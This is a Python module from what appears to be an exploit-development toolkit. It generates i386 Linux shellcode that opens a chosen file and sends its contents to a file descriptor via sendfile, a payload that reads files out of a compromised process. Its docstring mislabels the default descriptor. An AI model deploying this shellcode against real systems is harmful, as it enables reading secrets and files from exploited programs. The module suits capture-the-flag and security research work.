from pwn.shellcode_helper import *

@shellcode_reqs(arch='i386', os='linux')
def readfile(filepath, out_fd = 1):
    """Args: filepath, [out_fd (imm/reg) = STD_IN]
    Reads contents of filepath and sends it to out_fd (default: STD_IN because,
    hey, they're all the same).

    Segfaults if file can't be opened (because it doesn't exist or whatever)."""
    return """
        ; Clear eax, ecx, edx
        xor ecx, ecx
        imul ecx
        %%define str `%(filepath)s`
        push eax
        pushstr str
        mov ebx, esp
        mov al, SYS_open
        int 0x80

        mov ecx, eax ; in_fd
        setfd ebx, %(out_fd)s ; out_fd
        xor edx, edx ; offset
        mov esi, 0x7fffffff
        mov al, SYS_sendfile ; hope that fd is less than 255
        int 0x80
""" % {'filepath': filepath,
       'out_fd'  : out_fd}
